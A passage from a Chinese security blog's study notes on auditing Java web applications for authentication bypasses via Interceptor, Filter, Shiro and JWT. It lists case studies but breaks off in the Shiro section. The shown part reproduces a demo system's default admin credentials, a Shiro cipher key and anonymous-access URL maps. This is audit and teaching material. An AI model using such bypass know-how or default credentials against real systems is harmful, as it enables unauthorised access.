@@ -1,0 +1,2005 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Java代码审计之权限绕过">
+<title>Java代码审计之权限绕过</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Java代码审计之权限绕过">
+<meta property='og:description' content="Java代码审计之权限绕过">
+<meta property='og:url' content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-26T22:15:04&#43;08:00'/><meta property='article:modified_time' content='2025-09-26T22:59:32&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/logo.jpg' />
+<meta name="twitter:title" content="Java代码审计之权限绕过">
+<meta name="twitter:description" content="Java代码审计之权限绕过"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#java开发中目前主流鉴权技术">Java开发中目前主流鉴权技术</a></li>
+    <li><a href="#如何审计此类身份验证未授权访问漏洞">如何审计此类身份验证未授权访问漏洞？</a></li>
+    <li><a href="#1传统代码验证">1.传统代码验证</a></li>
+    <li><a href="#2使用shiro框架验证">2.使用Shiro框架验证</a></li>
+    <li><a href="#案例1tumo未授权任意评论删除">案例1.tumo未授权任意评论删除</a></li>
+    <li><a href="#3filter过滤器验证">3.Filter过滤器验证</a>
+      <ol>
+        <li><a href="#31华夏erp_">3.1.<strong>华夏ERP_V2.1未授权访问漏洞</strong></a></li>
+        <li><a href="#32tmall商城系统鉴权漏洞">3.2.Tmall商城系统鉴权漏洞</a></li>
+        <li><a href="#33华夏erp系统鉴权漏洞">3.3.华夏ERP系统鉴权漏洞</a>
+          <ol>
+            <li><a href="#"><strong>第一处：如果请求url中包含/login.html或者register.html，那么就直接放行</strong></a></li>
+            <li><a href="#第二处ignoredurl表示不走过滤器的url值为当请求url中存在后缀名为cssjsjpgpnggifico"><strong>第二处：ignoredUrl表示不走过滤器的url，值为当请求url中存在后缀名为</strong><code>.css#.js#.jpg#.png#.gif#.ico</code><strong>这些文件后缀，那么直接放行</strong></a></li>
+            <li><a href="#第三处filterpath特定允许路径通过-filterpath-参数配置如-userlogin-userregisteruser可能用于开放某些接口或页面的访问权限">第三处：filterPath**特定允许路径：通过 **<code>filterPath</code> 参数配置（如 <strong><code>/user/login</code></strong>, <strong><code>/user/registerUser</code></strong>），可能用于开放某些接口或页面的访问权限。</a></li>
+          </ol>
+        </li>
+        <li><a href="#34aj-report鉴权漏洞cnvd-2024-15077">3.4.AJ-Report鉴权漏洞（CNVD-2024-15077）</a></li>
+      </ol>
+    </li>
+    <li><a href="#4jwt权限校验问题">4.JWT权限校验问题</a>
+      <ol>
+        <li><a href="#41fastcms-jwt密钥泄露">4.1.Fastcms-JWT密钥泄露</a></li>
+      </ol>
+    </li>
+    <li><a href="#5">5.<strong>Interceptor鉴权审计</strong></a>
+      <ol>
+        <li><a href="#"><strong>5.1.NewbeeMall电商系统</strong></a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/logo_hu_da8399028ea907f9.jpg"
+                        srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/logo_hu_da8399028ea907f9.jpg 800w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/logo_hu_1f3189449a13e4c0.jpg 1600w"
+                        width="800" 
+                        height="435" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计之权限绕过" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+            <a href="/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="background-color: #2a9d8f; color: #fff;">
+                Java代码审计
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">Java代码审计之权限绕过</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Java代码审计之权限绕过
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 26, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 12 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://blog.csdn.net/qq_46081990/article/details/135207986?spm=1001.2014.3001.5501"  target="_blank" rel="noopener"
+    >Java代码审计&amp;鉴权漏洞&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_java鉴权-CSDN博客</a></p>
+<h2 id="java开发中目前主流鉴权技术">Java开发中目前主流鉴权技术
+</h2><p><strong><font style="color:rgb(221, 74, 104);">Interceptor</font><font style="color:rgb(77, 77, 77);">是一种拦截器，也称之为拦截器链（Interceptor Chain），主要用于拦截请求、响应或处理过程中的某些事件，比如权限认证、日志记录、性能测试等。在 Java 中，Interceptor可以用来扩展框架，增加或修改某个方法的行为，或者对应用流程做些前置处理、后置处理、环绕处理等。</font></strong></p>
+<p><strong>Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</strong></p>
+<p><strong><font style="color:rgb(221, 74, 104);">Shiro/Spring Security/CAS等鉴权框架</font><font style="color:rgb(77, 77, 77);">是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</font></strong></p>
+<p><strong><font style="color:rgb(221, 74, 104);">JWT</font><font style="color:rgb(77, 77, 77);">（JSON Web Token），将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。</font></strong></p>
+<p><font style="color:rgb(221, 74, 104);">使用Spring Cloud Gateway API网关</font></p>
+<h2 id="如何审计此类身份验证未授权访问漏洞">如何审计此类身份验证未授权访问漏洞？
+</h2><p><strong><font style="color:#DF2A3F;">项目采用哪种技术来做身份验证，从配置文件，依赖文件和关键字进行搜索</font></strong></p>
+<h2 id="1传统代码验证">1.传统代码验证
+</h2><p><a class="link" href="https://www.onlinedown.net/soft/989149.htm"  target="_blank" rel="noopener"
+    >维熵租车系统数据库</a></p>
+<p><strong>下载目标源码，部署数据库服务，使用Tomcat启动，注意Tomcat版本不能太高，最好在10以下</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">http</span><span class="p">:</span><span class="c1">//localhost:8080/opencarrun/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">http</span><span class="p">:</span><span class="c1">//localhost:8080/opencarrun/admin/login   </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="n">默认账号</span><span class="err">：</span><span class="n">adimin</span><span class="w">   </span><span class="n">默认密码</span><span class="err">：</span><span class="n">zft3285497</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="2使用shiro框架验证">2.使用Shiro框架验证
+</h2><p><a class="link" href="https://github.com/TyCoding/tumo"  target="_blank" rel="noopener"
+    >https://github.com/TyCoding/tumo</a></p>
+<p><strong>加载项目，查看项目架构，查看引入的依赖，发现使用了Shiro框架，查看Shiro的配置文件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">Shiro配置文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">即用户登录后</span><span class="err">，</span><span class="n">如果</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="n">小时内没有操作</span><span class="err">，</span><span class="n">会话自动失效</span><span class="err">，</span><span class="n">需要重新登录</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">session_timeout</span><span class="o">=</span><span class="n">3600</span><span class="w">         </span><span class="c1">//session会话超时</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">cookie_timeout</span><span class="o">=</span><span class="n">86400</span><span class="w">         </span><span class="c1">//Cookie有效期</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//这些 URL 不需要登录 即可访问，通常用于 登录页、静态资源、公共页面 等。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">anon_url</span><span class="o">=</span><span class="err">\</span><span class="w">                   </span><span class="c1">//匿名访问URL</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">/</span><span class="n">login</span><span class="p">,</span><span class="o">/</span><span class="n">logout</span><span class="p">,</span><span class="o">/</span><span class="n">register</span><span class="p">,</span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">/</span><span class="p">,</span><span class="o">/</span><span class="n">about</span><span class="p">,</span><span class="o">/</span><span class="n">p</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">links</span><span class="p">,</span><span class="o">/</span><span class="n">comment</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">link</span><span class="o">/</span><span class="n">list</span><span class="p">,</span><span class="o">/</span><span class="n">article</span><span class="o">/</span><span class="n">list</span><span class="p">,</span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">/</span><span class="n">css</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">js</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">img</span><span class="o">/**</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">login_url</span><span class="o">=/</span><span class="n">login</span><span class="w">             </span><span class="c1">//登录登场出URL</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">success_url</span><span class="o">=/</span><span class="n">system</span><span class="w">          
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">logout_url</span><span class="o">=/</span><span class="n">logout</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//设置 加密密钥，用于 密码加密、Cookie 加密等。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">cipher_key</span><span class="o">=</span><span class="n">tycoding</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/**</span><span class="w"> </span><span class="n">匹配任意子路径</span><span class="err">（</span><span class="n">如</span><span class="w"> </span><span class="o">/</span><span class="n">p</span><span class="o">/**</span><span class="w"> </span><span class="n">匹配</span><span class="w"> </span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">1</span><span class="err">、</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">abc</span><span class="w"> </span><span class="n">等</span><span class="err">）。</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>除了会写在配置文件中，还会写在配置类中</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/1.png"
+	width="1511"
+	height="884"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/1_hu_6c21dba5e2943f8c.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/1_hu_96d38a86b3d62c10.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="410px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Bean</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="p">{</span><span class="s">&#34;shiroFilter&#34;</span><span class="p">})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ShiroFilterFactoryBean</span><span class="w"> </span><span class="nf">shiroFilterFactoryBean</span><span class="p">(</span><span class="n">SecurityManager</span><span class="w"> </span><span class="n">securityManager</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ShiroFilterFactoryBean</span><span class="w"> </span><span class="n">bean</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ShiroFilterFactoryBean</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">bean</span><span class="p">.</span><span class="na">setSecurityManager</span><span class="p">(</span><span class="n">securityManager</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">bean</span><span class="p">.</span><span class="na">setLoginUrl</span><span class="p">(</span><span class="s">&#34;/login&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">bean</span><span class="p">.</span><span class="na">setUnauthorizedUrl</span><span class="p">(</span><span class="s">&#34;/unauth&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">LinkedHashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/doLogin&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/json&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/index&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/init&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/getKey&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/setKey&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/ser&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;anon&#34;</span><span class="p">);</span><span class="w">
